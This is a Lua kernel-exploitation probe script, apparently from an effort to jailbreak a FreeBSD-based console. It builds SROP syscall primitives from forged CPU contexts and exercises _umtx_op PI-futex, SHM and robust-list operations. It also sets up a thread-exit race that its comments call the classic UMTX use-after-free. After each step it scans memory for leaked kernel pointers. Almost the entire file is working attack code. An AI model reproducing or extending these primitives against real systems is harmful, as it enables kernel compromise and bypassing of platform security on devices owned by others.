-- CRASH_CLASS: LOW
-- PROBE 141b: PI futex operations — focused testing
--
-- 141a showed LOCK_PI works (ret=0, futex=0x1) but UNLOCK_PI
-- timed out. Test each PI operation individually with canary checks.

print("=== PROBE 141b: PI OPS ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local rip = memory.read_qword(ctx + MC + 0xA0)
local rh2, rl2 = get_hi_lo(rip)
local sc_addr = uint64(string.format("0x%X%08X", rh2, rl2 - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    memory.write_qword(ctx + MC + 0xA0, sc_addr)
    memory.write_qword(ctx + MC + 0x38, uint64(num))
    if a1 then memory.write_qword(ctx + MC + 0x08, a1) end
    if a2 then memory.write_qword(ctx + MC + 0x10, a2) end
    if a3 then memory.write_qword(ctx + MC + 0x18, a3) end
    if a4 then memory.write_qword(ctx + MC + 0x50, a4) end
    if a5 then memory.write_qword(ctx + MC + 0x28, a5) end
    if a6 then memory.write_qword(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x40000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))
local function ua(v) return uint64(string.format("0x%X", to_num(v))) end
local function zero(addr, len)
    for off = 0, len - 1, 4 do memory.write_dword(addr + off, 0) end
end

-- TID
local tid_buf = gpu + 0x100
memory.write_qword(tid_buf, uint64(0))
srop(432, ua(tid_buf))
local our_tid = safe_rq(tid_buf)
local tidh, tidl = get_hi_lo(our_tid)
print("TID=" .. hex(our_tid) .. " (" .. tidl .. ")")

--------------------------------------------------------------------
-- A: LOCK_PI only (no unlock) — verify it works
--------------------------------------------------------------------
print("")
print("--- [A] LOCK_PI only ---")
local f1 = gpu + 0x1000
memory.write_dword(f1, 0)
-- UMTX_OP_LOCK_PI = 12
-- With UMTX_CHECK_UNPARKING flag or _PRIVATE variants?
-- Try with val=0 (non-blocking trylock)
-- Actually on FreeBSD, _umtx_op(obj, UMTX_OP_LOCK_PI, 0, NULL, NULL)
-- blocks if futex is owned. We need UMTX_ABSTIME or timeout.
-- Let's use uaddr2=&timeout with a zero timeout for non-blocking
local ts_buf = gpu + 0x200
zero(ts_buf, 16) -- zero timeout = try only
local rv1 = srop(454, ua(f1), uint64(12), uint64(0), uint64(0), ua(ts_buf))
print("[A] LOCK_PI ret=" .. hex(rv1))
print("[A] futex=" .. string.format("0x%X", to_num(memory.read_dword(f1))))
print("[A] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- B: TRYLOCK_PI(14) — explicit non-blocking
--------------------------------------------------------------------
print("")
print("--- [B] TRYLOCK_PI ---")
local f2 = gpu + 0x2000
memory.write_dword(f2, 0)
-- UMTX_OP_TRYLOCK_PI = 14 on FreeBSD (Sony might differ)
local rv2 = srop(454, ua(f2), uint64(14), uint64(0), uint64(0), uint64(0))
print("[B] TRYLOCK_PI ret=" .. hex(rv2))
print("[B] futex=" .. string.format("0x%X", to_num(memory.read_dword(f2))))
print("[B] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- C: SET_CEILING(15) and GET_CEILING — PI ceiling
--------------------------------------------------------------------
print("")
print("--- [C] PI ceiling ---")
local f3 = gpu + 0x3000
memory.write_dword(f3, 0)
-- UMTX_OP_SET_CEILING = 15
-- Sets the priority ceiling of a PI futex
local rv3 = srop(454, ua(f3), uint64(15), uint64(100), uint64(0), uint64(0))
print("[C] SET_CEILING ret=" .. hex(rv3))
print("[C] futex=" .. string.format("0x%X", to_num(memory.read_dword(f3))))
print("[C] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- D: UMTX_OP_SHM operations
--------------------------------------------------------------------
print("")
print("--- [D] UMTX_OP_SHM ---")
local shm_key = gpu + 0x4000
memory.write_dword(shm_key, 0x42424242)

-- UMTX_SHM_CREAT=1
local rv_cr = srop(454, ua(shm_key), uint64(25), uint64(1), uint64(0), uint64(0))
local crh, crl = get_hi_lo(rv_cr)
print("[D] SHM_CREAT ret=" .. hex(rv_cr))
if crl == 0 and crh == 0 then
    print("[D] *** SHM_CREAT SUCCEEDED! ***")
    -- This creates a kernel umtx_shm object
    -- Try to look it up
    local rv_lu = srop(454, ua(shm_key), uint64(25), uint64(2), uint64(0), uint64(0))
    print("[D] SHM_LOOKUP ret=" .. hex(rv_lu))
    -- Try ALIVE check
    local rv_al = srop(454, ua(shm_key), uint64(25), uint64(4), uint64(0), uint64(0))
    print("[D] SHM_ALIVE ret=" .. hex(rv_al))
    -- Try DESTROY
    local rv_ds = srop(454, ua(shm_key), uint64(25), uint64(3), uint64(0), uint64(0))
    print("[D] SHM_DESTROY ret=" .. hex(rv_ds))

    -- Check kernel residue around shm_key
    for off = 0, 0x40, 8 do
        local v = safe_rq(shm_key + off)
        if v then
            local vh, vl = get_hi_lo(v)
            if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                print(string.format("[D] *** KPTR shm+0x%X: %s ***", off, hex(v)))
            end
        end
    end
end
print("[D] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- E: UMTX_OP_ROBUST_LISTS(26)
--------------------------------------------------------------------
print("")
print("--- [E] ROBUST_LISTS ---")
local robust = gpu + 0x5000
zero(robust, 0x100)
-- FreeBSD struct umtx_robust_lists_params has 3 pointers
memory.write_qword(robust, uint64(0))      -- robust_list_offset
memory.write_qword(robust + 8, uint64(0))  -- robust_priv_list_offset
memory.write_qword(robust + 16, uint64(0)) -- robust_inact_offset

local rv_rl = srop(454, ua(robust), uint64(26), uint64(0x18), uint64(0), uint64(0))
print("[E] ROBUST_LISTS ret=" .. hex(rv_rl))
local rlh, rll = get_hi_lo(rv_rl)
if rll == 0 and rlh == 0 then
    print("[E] *** ROBUST LIST REGISTERED! ***")
end
print("[E] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- F: UMTX ops survey — test all op numbers for ret=0
--------------------------------------------------------------------
print("")
print("--- [F] UMTX ops survey ---")
local survey_obj = gpu + 0x6000
for op = 0, 30 do
    if op ~= 12 and op ~= 6 and op ~= 7 and op ~= 8 and op ~= 9 and op ~= 10 then
        -- skip LOCK_PI(12) which blocks, and various WAIT ops
        zero(survey_obj, 0x20)
        local rv = srop(454, ua(survey_obj), uint64(op), uint64(0), uint64(0), uint64(0))
        local rvh, rvl = get_hi_lo(rv)
        if rvl == 0 and rvh == 0 then
            local val = to_num(memory.read_dword(survey_obj))
            print(string.format("[F] op=%d OK val=0x%X", op, val))
        end
    end
end
print("[F] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- G: Thread LOCK_PI + thr_exit race
-- Create a thread that does LOCK_PI then immediately exits.
-- This is the classic UMTX use-after-free scenario.
--------------------------------------------------------------------
print("")
print("--- [G] Thread exit + PI lock ---")
-- For the thread: set up SROP context to call LOCK_PI, but through
-- the normal make_syscall path. Thread entry = ret gadget, falls into thr_exit.

-- Actually, the thread via thr_create(430) with SROP context directly calls
-- the syscall instruction. So we set RAX=454 (umtx_op), RDI=futex, RSI=12.
-- After the syscall returns, the thread will be at the next instruction after
-- the syscall, which on the ret sled will be a ret → fall through → crash → exit.

local race_futex = gpu + 0x7000
memory.write_dword(race_futex, 0)

-- Thread stack area
local tstack = gpu + 0x8000

-- Create thread context
local tctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(tctx)) end)
memory.write_qword(tctx + MC + 0xA0, sc_addr)  -- RIP = syscall instr
memory.write_qword(tctx + MC + 0x38, uint64(431))  -- RAX = thr_exit(431)
memory.write_qword(tctx + MC + 0x08, uint64(0))  -- RDI = 0 (exit status)
memory.write_qword(tctx + MC + 0xB8, ua(tstack + 0x800))  -- RSP
memory.write_dword(tctx + MC + 0x98, 0x43)  -- CS
memory.write_dword(tctx + MC + 0xB0, 0x3B)  -- SS

-- Pre-write our TID to the futex (simulate ownership)
-- On FreeBSD, futex word is TID of owner | flags
-- After locking in section A, it was just 0x1.
-- Let's try with the futex set to our actual TID
memory.write_dword(race_futex, tidl)

-- Create a thread that will thr_exit immediately
-- This creates a kernel thread object with associated umtx state
local tid_out = gpu + 0x9000
memory.write_qword(tid_out, uint64(0))
local rv_tc = srop(430, ua(tctx), uint64(0x500), ua(tid_out), uint64(0), uint64(0))
local new_tid = safe_rq(tid_out)
local nth, ntl = 0, 0
if new_tid then nth, ntl = get_hi_lo(new_tid) end
print("[G] thr_create rv=" .. hex(rv_tc) .. " tid=" .. ntl)

-- Now the thread has exited (thr_exit). Check futex state.
local fv = to_num(memory.read_dword(race_futex))
print("[G] futex after thread exit=" .. string.format("0x%X", fv))

-- Try UNLOCK_PI on the futex (val=our TID, but the thread that "locked"
-- it has exited — this is the race condition target)
-- Skip this since UNLOCK_PI might block
-- Instead, just scan for kernel residue

-- Scan the futex area and thread stack for kernel pointers
print("[G] Futex area scan:")
local kfound = 0
for off = 0, 0x100, 8 do
    local v = safe_rq(race_futex + off)
    if v then
        local vh, vl = get_hi_lo(v)
        if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
            kfound = kfound + 1
            print(string.format("[G] *** KPTR futex+0x%X: %s ***", off, hex(v)))
        end
    end
end

print("[G] Thread stack scan:")
for off = 0, 0x800, 8 do
    local v = safe_rq(tstack + off)
    if v then
        local vh, vl = get_hi_lo(v)
        if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
            kfound = kfound + 1
            print(string.format("[G] *** KPTR stack+0x%X: %s ***", off, hex(v)))
        end
    end
end

print("[G] kptrs=" .. kfound)
print("[G] pid=" .. to_num(sc20()))
print("=== DONE ===")
